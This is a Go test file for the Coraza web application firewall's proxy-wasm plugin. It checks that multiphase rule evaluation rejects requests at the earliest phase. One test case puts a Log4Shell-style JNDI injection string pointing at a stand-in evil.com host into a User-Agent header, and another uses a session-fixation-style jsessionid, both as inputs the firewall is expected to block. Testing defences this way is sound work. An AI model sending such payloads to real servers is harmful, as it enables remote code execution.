// Copyright The OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

//go:build coraza.rule.multiphase_evaluation

// Multiphase specific tests
// Enabling the multiphase evaluation feature, it is expected to check rule variables at the earliest possible phase. These tests are meant
// to check circumstances in which multiphase evaluation should anticipate some variables evaluation, leading to an earlier action enforcment and
// therefore dropping the request at the earliest possible phase.
// It notably permits to avoid coraza-proxy-wasm bypasses by analyzing received data as soon as possible, before streaming it upstream.

package main

import (
	"bytes"
	"fmt"
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
	"github.com/tetratelabs/proxy-wasm-go-sdk/proxywasm/proxytest"
	"github.com/tetratelabs/proxy-wasm-go-sdk/proxywasm/types"
)

func TestLifecycleMultiPhase(t *testing.T) {
	reqProtocol := "HTTP/1.1"
	respHdrs := [][2]string{
		{":status", "200"},
		{"Server", "gotest"},
		{"Content-Length", "12"},
		{"Content-Type", "text/plain"},
	}
	respBody := []byte(`Hello, yogi!`)

	tests := []struct {
		name                                string
		inlineRules                         string
		reqHdrs                             [][2]string
		reqBody                             []byte
		requestHdrsAction                   types.Action
		requestBodyAction                   types.Action
		responseHdrsAction                  types.Action
		responded403                        bool
		responded413                        bool
		respondedNullBody                   bool
		expectResponseRejectSinceFirstChunk bool
	}{
		{
			name: "Deny anticipated at request headers phase from request body phase",
			inlineRules: `
			SecRuleEngine On\nSecRule REQUEST_URI \"@rx panda\" \"id:101,phase:2,t:lowercase,deny\"
			`,
			reqHdrs: [][2]string{
				{":path", "/panda"},
				{":method", "GET"},
				{":authority", "localhost"},
			},
			reqBody:           []byte(``),
			requestHdrsAction: types.ActionPause,
			responded403:      true,
		},
		{
			name: "Deny anticipated at request headers phase from response headers phase via splitting ARGS variable",
			inlineRules: `
			SecRuleEngine On\nSecRule ARGS \"@rx panda\" \"id:101,phase:3,t:lowercase,deny\"
			`,
			reqHdrs: [][2]string{
				{":path", "/end?arg=panda"},
				{":method", "GET"},
				{":authority", "localhost"},
			},
			reqBody:           []byte(``),
			requestHdrsAction: types.ActionPause,
			responded403:      true,
		},
		{
			name: "Deny anticipated at request headers phase from response body phase via splitting ARGS_NAMES variable",
			inlineRules: `
			SecRuleEngine On\nSecRule ARGS_NAMES \"@rx panda\" \"id:101,phase:4,t:lowercase,deny\"
			`,
			reqHdrs: [][2]string{
				{":path", "/end?panda=aa"},
				{":method", "GET"},
				{":authority", "localhost"},
			},
			reqBody:           []byte(``),
			requestHdrsAction: types.ActionPause,
			responded403:      true,
		},
		{
			name: "ARGS variable still checked at request body phase",
			inlineRules: `
			SecRuleEngine On\nSecRequestBodyAccess On\nSecRule ARGS \"@rx panda\" \"id:101,phase:2,t:lowercase,deny\"
			`,
			reqHdrs: [][2]string{
				{":path", "/end"},
				{":method", "POST"},
				{":authority", "localhost"},
				{"Content-Type", "application/x-www-form-urlencoded"},
				{"Content-Length", "25"},
			},
			reqBody:           []byte(`animal=bear&animal2=apanda`),
			requestHdrsAction: types.ActionContinue,
			requestBodyAction: types.ActionPause,
			responded403:      true,
		},
		{
			name: "Deny anticipated at request body phase from response headers phase",
			inlineRules: `
			SecRuleEngine On\nSecRequestBodyAccess On\nSecRule REQUEST_BODY \"@rx panda\" \"id:101,phase:3,t:lowercase,deny\"
			`,
			reqHdrs: [][2]string{
				{":path", "/end"},
				{":method", "POST"},
				{":authority", "localhost"},
				{"Content-Type", "application/x-www-form-urlencoded"},
				{"Content-Length", "5"},
			},
			reqBody:           []byte(`panda`),
			requestHdrsAction: types.ActionContinue,
			requestBodyAction: types.ActionPause,
			responded403:      true,
		},
		{
			name: "Deny anticipated at response headers phase from response body phase",
			inlineRules: `
			SecRuleEngine On\nSecRule RESPONSE_HEADERS:server \"@rx gotest\" \"id:101,phase:4,t:lowercase,deny\"
			`,
			reqHdrs: [][2]string{
				{":path", "/"},
				{":method", "GET"},
				{":authority", "localhost"},
			},
			requestHdrsAction:  types.ActionContinue,
			requestBodyAction:  types.ActionContinue,
			responseHdrsAction: types.ActionPause,
			responded403:       true,
		},
		{
			name: "944150 - Deny anticipated at request headers phase from response headers phase",
			inlineRules: `
			Include @demo-conf\nInclude @crs-setup-conf\nInclude @owasp_crs/*.conf
			`,
			reqHdrs: [][2]string{
				{":path", "/"},
				{":method", "GET"},
				{":authority", "localhost"},
				{"User-Agent", "ua${jndi:ldap://evil.com/webshell}"},
			},
			reqBody:           []byte(``),
			requestHdrsAction: types.ActionPause,
			responded403:      true,
		},
		{
			name: "943120 - Deny anticipated at request headers phase from response headers phase",
			inlineRules: `
			Include @demo-conf\nInclude @crs-setup-conf\nInclude @owasp_crs/*.conf
			`,
			reqHdrs: [][2]string{
				{":path", "/login.php?jsessionid=74B0CB414BD77D17B5680A6386EF1666"},
				{":method", "GET"},
				{":authority", "localhost"},
				{"User-Agent", "gotest"},
			},
			reqBody:           []byte(``),
			requestHdrsAction: types.ActionPause,
			responded403:      true,
		},
	}

	vmTest(t, func(t *testing.T, vm types.VMContext) {
		for _, tc := range tests {
			tt := tc

			t.Run(tt.name, func(t *testing.T) {
				conf := `{"directives_map": {"default": []}, "default_directives": "default"}`
				if inlineRules := strings.TrimSpace(tt.inlineRules); inlineRules != "" {
					conf = fmt.Sprintf(`{"directives_map": {"default": ["%s"]}, "default_directives": "default"}`, inlineRules)
				}
				opt := proxytest.
					NewEmulatorOption().
					WithVMContext(vm).
					WithPluginConfiguration([]byte(conf))

				host, reset := proxytest.NewHostEmulator(opt)
				defer reset()

				require.Equal(t, types.OnPluginStartStatusOK, host.StartPlugin())

				id := host.InitializeHttpContext()

				require.NoError(t, host.SetProperty([]string{"request", "protocol"}, []byte(reqProtocol)))

				requestBodyAction := types.ActionPause
				responseHdrsAction := types.ActionPause

				requestHdrsAction := host.CallOnRequestHeaders(id, tt.reqHdrs, false)
				require.Equal(t, tt.requestHdrsAction, requestHdrsAction)

				checkTXMetric(t, host, 1)

				// Stream bodies in chunks of 5

				if requestHdrsAction == types.ActionContinue {
					if len(tt.reqBody) == 0 {
						requestBodyAction = host.CallOnRequestBody(id, []byte(``), true)
					} else {
						for i := 0; i < len(tt.reqBody); i += 5 {
							eos := i+5 >= len(tt.reqBody)
							var body []byte
							if eos {
								body = tt.reqBody[i:]
							} else {
								body = tt.reqBody[i : i+5]
							}
							requestBodyAction = host.CallOnRequestBody(id, body, eos)
							requestBodyAccess := strings.Contains(tt.inlineRules, "SecRequestBodyAccess On")
							switch {
							case eos:
								requireEqualAction(t, tt.requestBodyAction, requestBodyAction, "unexpected body action, want %q, have %q on end of stream")
							case requestBodyAccess:
								requireEqualAction(t, types.ActionPause, requestBodyAction, "unexpected request body action, want %q, have %q")
							default:
								requireEqualAction(t, types.ActionContinue, requestBodyAction, "unexpected request body action, want %q, have %q")
							}
						}
					}
				}

				if requestBodyAction == types.ActionContinue {
					responseHdrsAction = host.CallOnResponseHeaders(id, respHdrs, false)
					require.Equal(t, tt.responseHdrsAction, responseHdrsAction)
				}

				if responseHdrsAction == types.ActionContinue {
					responseBodyAccess := strings.Contains(tt.inlineRules, "SecResponseBodyAccess On")
					for i := 0; i < len(respBody); i += 5 {
						eos := i+5 >= len(respBody)
						var body []byte
						if eos {
							body = respBody[i:]
						} else {
							body = respBody[i : i+5]
						}
						responseBodyAction := host.CallOnResponseBody(id, body, eos)
						switch {
						// expectResponseRejectLimitActionSinceFirstChunk: writing the first chunk (len(respBody) bytes), it is expected to reach
						// the ResponseBodyLimit with the Action set to Reject. When these conditions happen, ActionContinue will be returned,
						// with the interruption enforced replacing the body with null bytes (checked with tt.respondedNullBody)
						case eos, tt.expectResponseRejectSinceFirstChunk:
							requireEqualAction(t, types.ActionContinue, responseBodyAction, "unexpected response body action, want %q, have %q on end of stream")
						case responseBodyAccess:
							requireEqualAction(t, types.ActionPause, responseBodyAction, "unexpected response body action, want %q, have %q")
						default:
							requireEqualAction(t, types.ActionContinue, responseBodyAction, "unexpected response body action, want %q, have %q")
						}
					}
				}

				// Call OnHttpStreamDone.
				host.CompleteHttpContext(id)

				pluginResp := host.GetSentLocalResponse(id)
				switch {
				case tt.responded403:
					require.NotNil(t, pluginResp)
					require.EqualValues(t, 403, pluginResp.StatusCode)
				case tt.responded413:
					require.NotNil(t, pluginResp)
					require.EqualValues(t, 413, pluginResp.StatusCode)
				default:
					require.Nil(t, pluginResp)
				}
				if tt.respondedNullBody {
					pluginBodyResp := host.GetCurrentResponseBody(id)
					require.NotNil(t, pluginBodyResp)
					require.EqualValues(t, bytes.Repeat([]byte("\x00"), len(pluginBodyResp)), pluginBodyResp)
				}
			})
		}
	})
}
